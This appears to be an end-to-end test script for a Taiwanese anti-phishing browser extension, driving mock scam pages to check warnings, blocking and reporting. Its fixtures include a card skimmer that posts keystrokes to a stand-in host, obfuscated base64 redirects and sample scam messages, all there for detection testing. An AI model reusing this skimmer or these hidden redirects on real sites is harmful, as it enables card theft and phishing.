// 端對端測試：在真的 Chromium 載入擴充功能，用模擬網頁（不連到真實網站）驗證攔截、警告、通報流程。
// 執行：node test/e2e.mjs [截圖輸出資料夾]
import { createRequire } from 'node:module';
import { mkdtempSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
const { chromium } = require('playwright');
const EXT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const SHOTS = process.argv[2] || path.join(EXT, 'test', 'screenshots');
mkdirSync(SHOTS, { recursive: true });

const results = [];
const check = (name, ok, detail = '') => { results.push({ name, ok }); console.log(`${ok ? '✔' : '✘'} ${name}${detail ? ' — ' + detail : ''}`); };

// ── 模擬網頁 ──
const style = `<style>body{font-family:"Noto Sans TC",sans-serif;margin:0;background:#f4f6f9}header{background:#0b5394;color:#fff;padding:14px 24px;font-size:20px}
main{max-width:520px;margin:24px auto;background:#fff;padding:24px;border-radius:8px;box-shadow:0 2px 8px #0002}label{display:block;margin:12px 0 4px}
input{width:100%;padding:8px;font-size:16px;box-sizing:border-box}button{margin-top:16px;width:100%;padding:12px;background:#0b5394;color:#fff;border:0;font-size:16px}</style>`;
const PAGES = {
  'tw-parking-pay.com': `<!doctype html><html><head><meta charset="utf-8"><title>臺北市停車管理工程處-停車費線上繳納</title>${style}</head><body>
    <header>臺北市停車管理工程處</header><main><h1>停車費線上補繳</h1><p>您的車輛 ABC-1234 路邊停車費逾期未繳，請於今日內補繳以免產生滯納金。</p>
    <p>應繳金額：NT$ 120</p><label for="cc">信用卡卡號</label><input id="cc" placeholder="0000 0000 0000 0000">
    <label for="exp">有效期限</label><input id="exp" placeholder="MM/YY"><label for="cvv">安全碼</label><input id="cvv">
    <button>確認繳費</button><p><a href="https://www.ctbcbank.com.verify-login.top/">中國信託刷卡優惠</a> · <a href="https://evil-redirect.xyz/">www.post.gov.tw</a></p></main></body></html>`,
  'fine-notice.net': `<!doctype html><html><head><meta charset="utf-8"><title>交通違規罰鍰繳納通知</title>${style}</head><body>
    <header>交通違規罰鍰繳納</header><main><h1>罰單繳納</h1><p>您有一筆交通違規罰鍰尚未繳納（NT$ 1,800），逾期將移送強制執行。</p>
    <p>請於三日內以 ATM 轉帳至：<br>銀行代碼 (822) 帳號 1234-5678-9012-34<br>戶名：交通罰鍰代收處</p></main></body></html>`,
  'sport-coin.cc': `<!doctype html><html><head><meta charset="utf-8"><title>運動幣領取</title>${style}</head><body>
    <header>運動幣 500 元 領取專區</header><main><h1>恭喜您獲得運動幣</h1><p>領取前請完成身分驗證，系統將傳送簡訊驗證碼。</p>
    <label for="id">身分證字號</label><input id="id"><button id="next">下一步</button><div id="step2"></div></main>
    <script>document.getElementById('next').onclick=()=>{document.getElementById('step2').innerHTML='<label for="otp">簡訊驗證碼</label><input id="otp">'};</script></body></html>`,
  'www.mvdis.gov.tw': `<!doctype html><html><head><meta charset="utf-8"><title>監理服務網</title>${style}</head><body><header>監理服務網</header>
    <main><h1>罰鍰繳納</h1><label>信用卡卡號</label><input placeholder="0000 0000 0000 0000"></main></body></html>`,
  'my-small-shop.com': `<!doctype html><html><head><meta charset="utf-8"><title>結帳 - 小小手作店</title>${style}</head><body><header>小小手作店</header>
    <main><h1>結帳</h1><p>支援中國信託、玉山銀行信用卡。逾期未付款訂單將自動取消。</p><label>信用卡卡號</label><input placeholder="0000 0000 0000 0000"><label>安全碼</label><input></main></body></html>`,
  'fraudbuster.digiat.org.tw': `<!doctype html><html><head><meta charset="utf-8"><title>網詐通報查詢網（測試用模擬頁）</title>${style}</head><body><header>網詐通報（模擬）</header>
    <main><h1>通報可疑網站</h1><label for="u">可疑網址</label><input id="u" type="text"><label for="d">情形說明</label><textarea id="d" rows="5" style="width:100%"></textarea></main></body></html>`,
};
PAGES['pay-center.net'] = `<!doctype html><html><head><meta charset="utf-8"><title>停車費繳納</title>${style}</head><body><header>停車費繳納</header>
  <main><p>您的停車費尚未繳納，請完成付款。</p><div>請輸入</div><input id="x"><button>送出</button></main></body></html>`;
PAGES['stock-master.net'] = `<!doctype html><html><head><meta charset="utf-8"><title>免費領取飆股</title>${style}</head><body><header>股市名師</header>
  <main><h1>名師帶單 保證獲利</h1><p>穩賺不賠，每天推薦飆股！</p><a href="https://line.me/R/ti/p/@stockteacher">立即加入 LINE 好友領取</a></main></body></html>`;
PAGES['health-update.net'] = `<!doctype html><html><head><meta charset="utf-8"><title>健保署 健保快易通 APP 更新</title>${style}</head><body><header>衛生福利部中央健康保險署</header>
  <main><h1>健保署 APP 更新</h1><p>請下載最新版本以領取退費。</p><a href="/download/nhi.apk">下載 APP</a></main></body></html>`;
// 第六版：仿冒繳款網頁的新防線
// 抄襲官網：原始碼留著監理服務網的正式網址、直接載入官網 Logo；頁面文字沒有任何機構名稱
PAGES['pay-online-tw.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>線上繳費</title><link rel="canonical" href="https://www.mvdis.gov.tw/m3-emv-trn/">${style}</head><body>
  <header><img class="logo" src="https://www.mvdis.gov.tw/m3/images/logo.png" alt="" width="160" height="30"></header><main><h1>線上繳費</h1><p>請輸入繳費資料</p>
  <label for="c">信用卡卡號</label><input id="c"></main></body></html>`;
// 偷傳卡號：一邊打字一邊把卡號傳給另一個網站（詐騙套件常見做法）
PAGES['order-confirm-page.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>訂單確認</title>${style}</head><body><header>訂單確認</header>
  <main><p>請輸入付款資訊完成訂單。</p><label for="cn">卡號</label><input id="cn"><button id="b">送出</button></main>
  <script>document.getElementById('cn').addEventListener('input',(e)=>{fetch('https://collect-panel.com/api/k',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({k:e.target.value})}).catch(()=>{});});</script></body></html>`;
// 送出前確認：一般網站（不在官方清單）送出卡號前先確認一次；確認後照常送出
PAGES['handmade-goods.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>結帳 - 手作好物</title>${style}</head><body><header>手作好物</header>
  <main><form id="f"><label for="card">信用卡卡號</label><input id="card"><button id="pay" type="submit">確認付款</button></form></main>
  <script>document.getElementById('f').addEventListener('submit',(e)=>{e.preventDefault();fetch('/api/pay',{method:'POST',body:JSON.stringify({c:document.getElementById('card').value})}).then(()=>{document.title='PAID';});});</script></body></html>`;
// 正規金流：刷卡欄位放在 TapPay 的 iframe 裡
PAGES['gateway-shop.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>結帳</title>${style}</head><body><header>結帳</header>
  <main><p>信用卡付款</p><iframe src="https://js.tappaysdk.com/fields/card.html" width="300" height="40"></iframe></main></body></html>`;
// QR Code 繳費頁：跨網域的 PNG（台灣 Pay 轉帳碼）、data: 圖片（連到仿冒監理網址）、SVG（LINE 加好友）
const { encodeQr, toRgba, toPng } = await import('./qr-encode.mjs');
const QR_TWQR = toPng(toRgba(encodeQr('TWQRP://個人轉帳/158/02/V1?D1=60'), { scale: 5 }));
const QR_URL = 'data:image/png;base64,' + toPng(toRgba(encodeQr('https://www.mvdis.gov.tw.pay-fine.top/'), { scale: 4 })).toString('base64');
const svgQr = (text) => {
  const m = encodeQr(text), n = m.length;
  let rects = '';
  m.forEach((row, y) => row.forEach((v, x) => { if (v) rects += `<rect x="${x + 4}" y="${y + 4}" width="1" height="1"/>`; }));
  return `<svg width="${(n + 8) * 5}" height="${(n + 8) * 5}" viewBox="0 0 ${n + 8} ${n + 8}" shape-rendering="crispEdges"><rect width="100%" height="100%" fill="#fff"/><g fill="#000">${rects}</g></svg>`;
};
PAGES['parking-qr-pay.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>停車費線上繳納</title>${style}</head><body><header>臺北市停車管理工程處</header>
  <main><h1>停車費補繳</h1><p>請使用行動支付 App 掃描下方 QR Code 繳納停車費 NT$ 60。</p>
  <img src="https://cdn-qrimg.net/pay/abc.png" width="185" height="185" alt="">
  <p>或掃描查詢罰單明細：</p><img src="${QR_URL}" width="150" height="150" alt="">
  <p>客服 LINE 加好友：</p>${svgQr('https://line.me/ti/p/~scam-line-tw')}</main></body></html>`;

// Logo 比對：網站圖示是「中國信託」的 Logo（測試用的模擬圖），頁面文字完全沒提到銀行名稱
const { dhash } = await import('../src/lib/image-hash.js');
const logoRgba = (() => {
  const w = 240, h = 120, data = new Uint8ClampedArray(w * h * 4);
  for (let y = 0; y < h; y++) for (let x = 0; x < w; x++) {
    const nx = (x + 0.5) / w, ny = (y + 0.5) / h;
    const c = Math.hypot(nx - 0.25, ny - 0.5) < 0.2 ? [200, 20, 40] : nx > 0.5 && ny > 0.3 && ny < 0.7 ? [30, 60, 140] : [255, 255, 255];
    data.set([...c, 255], (y * w + x) * 4);
  }
  return { data, width: w, height: h };
})();
const LOGO_PNG = toPng(logoRgba);
const logoDb = { format: 'oug-logo-hashes', generatedAt: '2099-01-01T00:00:00Z', hashes: [{ h: dhash(logoRgba), site: '中國信託商業銀行', domain: 'ctbcbank.com', kind: 'icon' }] };
PAGES['card-verify-tw.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>信用卡安全驗證</title><link rel="icon" href="https://img-cdn-mock.net/fav.png">${style}</head><body>
  <header><img src="https://img-cdn-mock.net/fav.png" width="120" height="60" alt=""></header><main><h1>安全驗證</h1><p>為保障您的權益，請輸入卡號完成驗證。</p>
  <label for="c">卡號</label><input id="c"></main></body></html>`;

// 裝置端 AI：網銀登入頁只寫英文簡稱「MEGA ICBC」，關鍵字看不出是哪家銀行
PAGES['secure-member-login.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>Member Login</title>${style}</head><body><header>MEGA ICBC</header>
  <main><h1>Member Login</h1><p>Please enter your user ID, password and SMS verification code to continue.</p>
  <label for="u">User ID</label><input id="u"><label for="p">Password</label><input id="p" type="password">
  <label for="o">SMS verification code</label><input id="o" autocomplete="one-time-code"></main></body></html>`;

// 模擬 RDAP：tw-parking-pay.com 5 天前才註冊
const FIVE_DAYS_AGO = new Date(Date.now() - 5 * 86400000 - 3600000).toISOString();
const rdapRequests = [];

// 模擬 Gmail 的開信畫面（沿用 Gmail 的 class 名稱；內容是使用者實際收到的詐騙信，已移除追蹤代碼）
const gmail = (subject, fromName, fromAddr, bodyHtml) => `<!doctype html><html><head><meta charset="utf-8"><title>Gmail</title></head><body>
  <div role="main"><h2 class="hP">${subject}</h2><div class="adn"><span class="gD" email="${fromAddr}" name="${fromName}">${fromName}</span>
  <div class="a3s aiL">${bodyHtml}</div></div></div></body></html>`;
PAGES['mail.google.com'] = gmail('年末調整による還付金のお支払いについて', '国税庁', 'info@nta-etax-refund.com',
  `<p>お手元のAndr\u200boidスマートフォンよりご確認ください。</p><p>平素よりe-Taxをご利用いただき、誠にありがとうございます。国税庁でございます。</p>
   <p>2025年分の年末調整の処\u200d理が完了し、還付金をお受け取りいただける運びとなりました。</p>
   <p><a href="https://yarlgs.com/AbCdEf.money">還付金の内容を確認する</a></p><p>※ 国税庁が口座番号・暗証番号の入力を求めることは一切ありません。</p>`);
PAGES['outlook.live.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>Outlook</title></head><body><div role="main">
  <div role="heading">牌照稅繳納通知</div><span title="監理服務網 <service@mvdis.gov.tw>">監理服務網</span>
  <div aria-label="Message body"><p>您好，本期使用牌照稅已開徵，請至監理服務網查詢：<a href="https://www.mvdis.gov.tw/">https://www.mvdis.gov.tw/</a></p></div></div></body></html>`;
// 模擬 Google 訊息網頁版（簡訊）與 WhatsApp 網頁版：沿用各網站的元素名稱與 class
PAGES['messages.google.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>Google 訊息</title></head><body><mws-conversation-container>
  <mws-message-wrapper class="incoming"><mws-text-message-part id="sms-scam"><div class="text-msg-content"><div class="text-msg">【監理服務網】您有一筆交通違規罰鍰逾期未繳，請於今日內至 <a href="https://mvdis-gov-tw.cc/pay">https://mvdis-gov-tw.cc/pay</a> 繳納，以免加重處罰。</div></div></mws-text-message-part></mws-message-wrapper>
  <mws-message-wrapper class="incoming"><mws-text-message-part id="sms-ok"><div class="text-msg-content"><div class="text-msg">媽，我今天會晚一點回家，晚餐不用等我喔，你們先吃。</div></div></mws-text-message-part></mws-message-wrapper>
  <mws-message-wrapper class="outgoing"><mws-text-message-part id="sms-mine"><div class="text-msg-content"><div class="text-msg">我剛剛收到這個，是詐騙嗎？ https://mvdis-gov-tw.cc/pay 看起來怪怪的</div></div></mws-text-message-part></mws-message-wrapper>
  </mws-conversation-container></body></html>`;
PAGES['web.whatsapp.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>WhatsApp</title></head><body><div id="main">
  <div class="message-in"><div class="copyable-text"><span class="selectable-text" id="wa-otp">我的手機壞了收不到簡訊，等一下會有一組驗證碼傳到你手機，收到後把驗證碼傳給我，拜託很急</span></div></div>
  <div class="message-in"><div class="copyable-text"><span class="selectable-text" id="wa-ok">週六下午三點在車站前集合，記得帶水和帽子，下雨就改期。</span></div></div>
  </div></body></html>`;
// 看不到網址的詐騙導流頁：連結藏在按鈕的 onclick、網頁程式（按下才跳轉）、base64 與 data 屬性裡
PAGES['hidden-link-notice.net'] = `<!doctype html><html><head><meta charset="utf-8"><title>通知</title></head><body><h1>您有一則未讀通知</h1>
  <button id="btn-onclick" onclick="location.href='https://mvdis-gov-tw.cc/pay'">查詢罰單</button>
  <button id="btn-js">立即繳費</button>
  <div id="card" data-href="https://ctbc-bank.top/login">信用卡優惠</div>
  <button id="btn-ok" onclick="location.href='https://www.mvdis.gov.tw/'">監理服務網</button>
  <button id="btn-ext">領取補助</button>
  <script>document.getElementById('btn-js').addEventListener('click', () => { window.location.href = atob('aHR0cHM6Ly93d3cubXZkaXMuZ292LnR3LnBheS1maW5lLnRvcC9sb2dpbg=='); });</script>
  <script src="https://static-cdn-mock.net/app.min.js"></script>
  <iframe id="frame" src="https://www.post.gov.tw.parcel-fee.top/form" width="300" height="80"></iframe>
  <script>
    // 執行時才組出來的網址：base64 拆成兩段，靜態掃描看不出來，要等程式解碼才知道
    var seg = ['aHR0cHM6Ly9mZXRjLWV0', 'YWctcGF5LnRvcC9iaWxs']; window.__dest = atob(seg.join(''));
    // 目的地由伺服器回傳
    fetch('/oug-config.json').then(function (r) { return r.json(); }).then(function (c) { window.__next = c.next; });
  </script>
  </body></html>`;
// 外部程式檔：目的地拆成好幾段、包在好幾層函式裡，按下按鈕才組起來
const HIDDEN_JS = `(function(){var a=['https://www.ctbc','bank.com.verify-','login.top/otp'];function b(i){return a[i]}function c(){return (function(){return b(0)+b(1)+b(2)})()}
  var parts='https://gov-tw-' + 'subsidy' + '.cyou/claim';document.getElementById('btn-ext').addEventListener('click',function(){setTimeout(function(){window['loc'+'ation']['hr'+'ef']=parts},50)})})();`;
const fallback = `<!doctype html><html><head><meta charset="utf-8"><title>模擬頁</title></head><body><p>模擬頁</p></body></html>`;

const userDataDir = mkdtempSync(path.join(tmpdir(), 'oug-'));
const context = await chromium.launchPersistentContext(userDataDir, {
  channel: 'chromium',
  headless: true,
  viewport: { width: 1100, height: 760 },
  deviceScaleFactor: 2,
  locale: 'zh-TW',
  args: [`--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`,
    // 有代理伺服器的環境（例如雲端測試機）讓清單下載走代理；其他網頁一律用下方的模擬頁
    ...(process.env.HTTPS_PROXY ? [`--proxy-server=${process.env.HTTPS_PROXY}`]
      // 沒有代理時（例如 GitHub Actions）在瀏覽器層擋掉真實網站，確保不會連到任何真實網站
      : ['--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE raw.githubusercontent.com, EXCLUDE data.moi.gov.tw'])],
});
// 模擬專案網站上的官方清單（線上更新測試用）
const { OFFICIAL_SITES } = await import('../src/data/official-sites.js');
const { exportOfficial } = await import('../src/lib/remote-official.js');
let remoteOfficial = exportOfficial([...OFFICIAL_SITES, { name: '測試新機構', category: '購物', domains: ['brand-new-official.com.tw'] }]);
const requestedHosts = new Set();
let feedMock = null;
await context.route('**/*', (route) => {
  const u = new URL(route.request().url());
  requestedHosts.add(u.hostname);
  if (!/^https?:$/.test(u.protocol)) return route.continue();
  if (u.hostname === 'cdn-qrimg.net') return route.fulfill({ status: 200, contentType: 'image/png', body: QR_TWQR });
  if (u.pathname === '/oug-config.json') return route.fulfill({ status: 200, contentType: 'application/json', body: '{"ok":true,"next":"https:\\/\\/nhi-gov-tw.cyou\\/refund"}' });
  if (u.hostname === 'static-cdn-mock.net') return route.fulfill({ status: 200, contentType: 'text/javascript; charset=utf-8', body: HIDDEN_JS });
  if (u.hostname === 'img-cdn-mock.net') return route.fulfill({ status: 200, contentType: 'image/png', body: LOGO_PNG });
  if (u.hostname === 'judylin0324.github.io' && u.pathname.endsWith('/logo-hashes.json')) {
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(logoDb) });
  }
  if (u.hostname === 'rdap.org') {
    rdapRequests.push(u.pathname);
    if (u.pathname === '/domain/tw-parking-pay.com') {
      return route.fulfill({ status: 200, contentType: 'application/rdap+json', body: JSON.stringify({ ldhName: 'tw-parking-pay.com', events: [{ eventAction: 'registration', eventDate: FIVE_DAYS_AGO }] }) });
    }
    return route.fulfill({ status: 404, contentType: 'application/rdap+json', body: '{}' });
  }
  // 每日彙整清單：預設不存在（擴充功能要自動改用原始來源）；feedMock 有值時才提供
  if (u.hostname === 'judylin0324.github.io' && /\/blocklist(-meta\.json|\.txt)$/.test(u.pathname)) {
    if (!feedMock) return route.fulfill({ status: 404, contentType: 'text/plain', body: 'not found' });
    return u.pathname.endsWith('.txt')
      ? route.fulfill({ status: 200, contentType: 'text/plain; charset=utf-8', body: feedMock.domains.join('\n') })
      : route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(feedMock.meta) });
  }
  if (u.hostname === 'judylin0324.github.io' && u.pathname.endsWith('/official-sites.json')) {
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(remoteOfficial) });
  }
  // 只有涉詐清單來源連真實網路，其他全部用模擬頁（不會連到任何真實詐騙網站）
  if (['raw.githubusercontent.com', 'data.moi.gov.tw'].includes(u.hostname)) return route.continue();
  return route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: PAGES[u.hostname] || fallback });
});

let [sw] = context.serviceWorkers();
if (!sw) sw = await context.waitForEvent('serviceworker');
const extId = new URL(sw.url()).host;
await new Promise((r) => setTimeout(r, 1500));
// 關掉安裝時自動開啟的設定頁；先停用自動更新並清掉安裝時下載的清單，讓前面的測試只看規則本身
for (const p of context.pages()) if (p.url().includes('options.html')) await p.close();
await sw.evaluate(async () => {
  const { settings } = await chrome.storage.local.get('settings');
  await chrome.storage.local.set({ settings: { ...settings, autoUpdateLists: false } });
  await chrome.storage.local.remove(['blocklist165']);
  await globalThis.__oug.syncBlockRules();
});

const page = await context.newPage();
// 擴充功能自己開的分頁（通報網站、GitHub Issue）在某些環境下會略過 context.route 的模擬頁；這時再用 Playwright 開一次模擬頁
const REPORT_URL = 'https://fraudbuster.digiat.org.tw/accessibility/index';
async function ensureMock(p, url) {
  await p.waitForLoadState('domcontentloaded').catch(() => {});
  if (!(await p.title().catch(() => '')).includes('模擬')) await p.goto(url).catch(() => {});
}
// 記錄擴充功能要求開啟的網址（GitHub 會把沒登入的人轉到登入頁，所以檢查「要求開啟的網址」）
await sw.evaluate(() => {
  globalThis.__opened = [];
  const create = chrome.tabs.create.bind(chrome.tabs);
  chrome.tabs.create = (opts, ...rest) => { globalThis.__opened.push(opts && opts.url); return create(opts, ...rest); };
});
const tabIdOf = async (p) => sw.evaluate(async (u) => (await chrome.tabs.query({})).find((t) => t.url === u || t.pendingUrl === u)?.id, p.url());
const verdictOf = async (p) => sw.evaluate(async (id) => (await chrome.storage.session.get('verdict:' + id))['verdict:' + id], await tabIdOf(p));
const overlayVisible = (p) => p.evaluate(() => !!document.querySelector('official-url-guard'));
const settle = (ms = 1800) => new Promise((r) => setTimeout(r, ms));
// 擴充功能把導航中途改道時，Playwright 的 waitForURL 可能提早結束，所以改用輪詢
const waitUrl = async (p, re, ms = 8000) => {
  const end = Date.now() + ms;
  while (Date.now() < end && !re.test(p.url())) await settle(200);
};

// 警告畫面放在封閉的 Shadow DOM 裡（網頁程式碰不到），測試透過 Chrome 開發者協定讀取與點擊
const attrOf = (n, k) => { const a = n.attributes || []; for (let i = 0; i < a.length; i += 2) if (a[i] === k) return a[i + 1]; return null; };
function findNode(node, pred) {
  if (pred(node)) return node;
  for (const c of [...(node.children || []), ...(node.shadowRoots || [])]) { const r = findNode(c, pred); if (r) return r; }
  return null;
}
async function uiFind(p, value) {
  const cdp = await context.newCDPSession(p);
  const { root } = await cdp.send('DOM.getDocument', { depth: -1, pierce: true });
  const n = findNode(root, (x) => attrOf(x, 'data-oug') === value);
  if (!n) { await cdp.detach(); return null; }
  return { cdp, n };
}
async function uiText(p, value) {
  const r = await uiFind(p, value);
  if (!r) return null;
  const { outerHTML } = await r.cdp.send('DOM.getOuterHTML', { nodeId: r.n.nodeId });
  await r.cdp.detach();
  return outerHTML.replace(/<style[\s\S]*?<\/style>/g, '').replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ');
}
async function uiClick(p, value) {
  const r = await uiFind(p, value);
  if (!r) return false;
  const { object } = await r.cdp.send('DOM.resolveNode', { nodeId: r.n.nodeId });
  await r.cdp.send('Runtime.callFunctionOn', { objectId: object.objectId, functionDeclaration: 'function () { this.click(); }' });
  await r.cdp.detach();
  return true;
}

// 1. 仿冒網址：連線前攔截
await page.goto('https://ctbc-bank.top/login').catch(() => {});
await waitUrl(page, /warning\.html/);
check('仿冒網址 ctbc-bank.top 被攔截到警告頁', page.url().startsWith(`chrome-extension://${extId}/src/pages/warning.html`), page.url().slice(0, 80) + ' / pages: ' + context.pages().map((p) => p.url().slice(0, 50)).join(' | '));
await settle(800);
await page.screenshot({ path: path.join(SHOTS, '1-warning-page.png') });

// 2. 假停車費頁：網址本身看不出仿冒，靠頁面內容判斷
await page.goto('https://tw-parking-pay.com/pay');
await settle();
const v2 = await verdictOf(page);
check('假停車費頁（自稱停管處＋信用卡欄位）判為危險', v2?.level === 'danger', v2?.reasons?.[0]?.text);
check('假停車費頁顯示全頁警告', await overlayVisible(page));
const ov2 = (await uiText(page, 'page-overlay')) || '';
check('全頁警告列出停車費的正確繳費管道', ov2.includes('停車費：請改用這些正確管道') && ov2.includes('ebill.ba.org.tw'), ov2.slice(0, 120));
check('小額誘餌：指出 120 元是為了讓你不設防', (v2?.reasons || []).some((r) => /120 元這種小額/.test(r.text)));
await page.screenshot({ path: path.join(SHOTS, '2-parking-overlay.png') });
// 一鍵查網站註冊多久（按了才查，只送網域名稱）
check('沒按之前不會自動查註冊日期', rdapRequests.length === 0, rdapRequests.join(','));
await uiClick(page, 'age');
await settle(1500);
const ov2b = (await uiText(page, 'page-overlay')) || '';
check('按「查註冊日期」顯示才註冊 5 天', /才 5 天/.test(ov2b) && rdapRequests.includes('/domain/tw-parking-pay.com'), ov2b.match(/註冊時間.{0,60}/)?.[0]);
await page.screenshot({ path: path.join(SHOTS, '2b-parking-age.png') });
// 一鍵通報附截圖：截圖存到下載資料夾，通報內容註明
await page.bringToFront();
const [rp2] = await Promise.all([context.waitForEvent('page'), uiClick(page, 'report')]);
await ensureMock(rp2, REPORT_URL);
await settle(2500);
// （Playwright 會把下載的檔案改成隨機檔名，所以檢查下載紀錄與通報內容裡的檔名）
const dl = await sw.evaluate(async () => (await chrome.downloads.search({ orderBy: ['-startTime'] })).map((d) => ({ by: d.byExtensionId, state: d.state, bytes: d.totalBytes || d.bytesReceived, mime: d.mime })));
const shot = dl.find((d) => d.by === extId && d.state === 'complete' && d.bytes > 5000);
check('一鍵通報時自動截圖存證（存到下載資料夾）', Boolean(shot), JSON.stringify(dl[0] || null));
// 通報網站的說明欄會自動帶入通報內容
const pr2 = { text: await rp2.inputValue('#d').catch(() => '') };
check('通報內容註明截圖檔名與網域註冊日期', pr2 && /網頁截圖：已存在下載資料夾（(官網守門員通報截圖|OfficialUrlGuard-report)\/tw-parking-pay\.com-\d{8}-\d{6}\.png）/.test(pr2.text) && /網域註冊日期/.test(pr2.text), pr2 && pr2.text.split('\n').slice(-3).join(' / '));
// 註冊日期已記住：之後再進這個網站，單看網址就會判為危險（連線前攔截）
await page.goto('https://tw-parking-pay.com/pay').catch(() => {});
await waitUrl(page, /warning\.html/);
check('查到才註冊 5 天後，再進入這個網站會在連線前攔截', page.url().includes('warning.html'), page.url().slice(0, 80));
// 後面的測試要看網頁內容，所以先清掉
await sw.evaluate(async () => { await chrome.storage.local.remove('rdapCache'); });
await settle(300);
await rp2.close();
await page.bringToFront();

// 3. 假罰單：轉帳指示（沒有任何輸入欄位）
await page.goto('https://fine-notice.net/');
await settle();
const v3 = await verdictOf(page);
check('假罰單轉帳頁判為危險', v3?.level === 'danger', v3?.reasons?.[0]?.text);
await page.screenshot({ path: path.join(SHOTS, '3-transfer-overlay.png') });

// 4. 運動幣：按「下一步」後才出現驗證碼欄位
await page.goto('https://sport-coin.cc/');
await settle();
const before = await overlayVisible(page);
if (!before) {
  await page.click('#next');
  await settle(2500);
}
const v4 = await verdictOf(page);
check('運動幣頁（身分證＋動態出現的驗證碼欄位）判為危險', v4?.level === 'danger' && (await overlayVisible(page)), v4?.reasons?.[0]?.text);

// 5. 真官網不打擾
await page.goto('https://www.mvdis.gov.tw/');
await settle();
const v5 = await verdictOf(page);
check('監理服務網（官方）不跳警告', v5?.level === 'official' && !(await overlayVisible(page)));

// 6. 一般商店：只提醒，不擋
await page.goto('https://my-small-shop.com/checkout');
await settle();
const v6 = await verdictOf(page);
check('一般商店結帳頁只顯示提醒（不全頁攔截）', v6?.level === 'caution', v6?.reasons?.[0]?.text);
await page.screenshot({ path: path.join(SHOTS, '4-shop-caution-bar.png') });

// 7. 彈出視窗（指定剛才的假停車費分頁）
const scamTab = await context.newPage();
await scamTab.goto('https://tw-parking-pay.com/pay');
await settle();
const scamTabId = await tabIdOf(scamTab);
const popup = await context.newPage();
await popup.setViewportSize({ width: 380, height: 640 });
await popup.goto(`chrome-extension://${extId}/src/pages/popup.html?tabId=${scamTabId}`);
await popup.fill('#manualInput', '【監理站】您有一筆交通罰單逾期未繳，請立即繳納 https://mvdis-gov-tw.cc/pay 以免吊扣駕照');
await popup.click('#manualBtn');
await settle(600);
const manual = await popup.textContent('#manualResult');
check('彈出視窗：貼上簡訊即可檢查網址', manual.includes('高度疑似詐騙'), manual.slice(0, 40));
await popup.screenshot({ path: path.join(SHOTS, '5-popup.png'), fullPage: true });
await popup.close();
await scamTab.close();

// 8. 一鍵通報：從警告頁按下通報，通報網站欄位自動帶入網址
await page.goto('https://ctbc-bank.top/login').catch(() => {});
await waitUrl(page, /warning\.html/);
await settle(800);
const [reportPage] = await Promise.all([context.waitForEvent('page'), page.click('#report')]);
await ensureMock(reportPage, REPORT_URL);
await settle(2500);
const filled = await reportPage.inputValue('#u').catch(() => '');
check('一鍵通報：開啟網詐通報網站並自動填入可疑網址', filled === 'https://ctbc-bank.top/login', filled);
await reportPage.screenshot({ path: path.join(SHOTS, '6-report-autofill.png') });

// 8b. 警告頁的「回報誤判」開啟預填好的 GitHub Issue（網址只保留到路徑）
await page.goto('https://ctbc-bank.top/login?token=secret123').catch(() => {});
await waitUrl(page, /warning\.html/);
await settle(800);
const [issuePage] = await Promise.all([context.waitForEvent('page'), page.click('#falsePositive')]);
await settle(800);
const issueHref = decodeURIComponent((await sw.evaluate(() => globalThis.__opened.filter((u) => /github\.com/.test(u)).pop())) || issuePage.url());
check('回報誤判開啟 GitHub Issue 表單並帶入網址', issueHref.startsWith('https://github.com/judylin0324/official-url-guard/issues/new') && issueHref.includes('url=https://ctbc-bank.top/login'), issueHref.slice(0, 160));
check('回報內容不含網址查詢參數（避免公開個資）', !issueHref.includes('secret123'));
await issuePage.close();

// 9. 匯入 165 清單後，清單上的網域在「送出請求前」就被攔下
const opt165 = await context.newPage();
await opt165.goto(`chrome-extension://${extId}/src/pages/options.html`);
await opt165.setInputFiles('#blFile', {
  name: '165.csv', mimeType: 'text/csv',
  buffer: Buffer.from('\uFEFF民國年月,網域,網站性質,法律依據,聲請單位\n11410,scam-invest-tw.com,假投資,詐欺犯罪危害防制條例第42條,刑事警察局\n11410,fake-shop-tw.net,假購物,同上,刑事警察局\n'),
});
await settle(1500);
const stat165 = await opt165.textContent('#manualStat');
check('設定頁手動匯入 165 CSV', stat165.includes('2 個網域'), stat165);
await opt165.close();
const rules = await sw.evaluate(() => chrome.declarativeNetRequest.getDynamicRules());
check('已建立連線前攔截規則', rules.some((r) => r.condition.requestDomains.includes('scam-invest-tw.com')));
requestedHosts.clear();
await page.goto('https://www.scam-invest-tw.com/join?ref=a&b=2').catch(() => {});
await waitUrl(page, /warning\.html/);
await settle(800);
check('165 清單網域在連線前被導到警告頁（declarativeNetRequest）', page.url().includes('src=list'), page.url().slice(0, 90));
check('請求完全沒有送到詐騙網站', !requestedHosts.has('www.scam-invest-tw.com'), [...requestedHosts].join(','));
const shownReason = await page.textContent('#reasons');
check('警告頁顯示「列在 165 清單」與完整網址', shownReason.includes('165') && (await page.textContent('#host')).includes('scam-invest-tw.com'), shownReason.trim());

// 10. 在警告頁「加入信任」後可以正常瀏覽
await page.click('summary');
await page.check('#ack');
await page.click('#trust');
await waitUrl(page, /^https:\/\/www\.scam-invest-tw\.com/);
await settle(1200);
check('加入信任後不再攔截', page.url().startsWith('https://www.scam-invest-tw.com/'), page.url());

// 11. 沒有任何標示的輸入框，打入通過檢查碼的卡號 → 立刻警告
await page.goto('https://pay-center.net/');
await settle();
const beforeType = await overlayVisible(page);
await page.click('#x');
await page.keyboard.type('4111 1111 1111 1111', { delay: 15 });
await settle(1500);
